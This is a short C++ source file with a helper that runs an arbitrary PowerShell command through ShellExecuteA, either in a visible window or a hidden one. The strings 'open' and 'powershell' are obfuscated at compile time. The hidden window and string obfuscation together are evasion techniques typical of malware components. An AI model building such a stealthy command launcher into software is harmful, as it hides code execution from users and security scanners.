#include "powershell.hpp"

void Powershell::startPowershell(const std::string *command, const bool type)
{
    if (type)
    {
        ShellExecuteA(NULL, AY_OBFUSCATE("open"), AY_OBFUSCATE("powershell"), command->c_str(), NULL, SW_HIDE);
    }
    else
    {
        ShellExecuteA(NULL, AY_OBFUSCATE("open"), AY_OBFUSCATE("powershell"), command->c_str(), NULL, SW_SHOW);
    }
}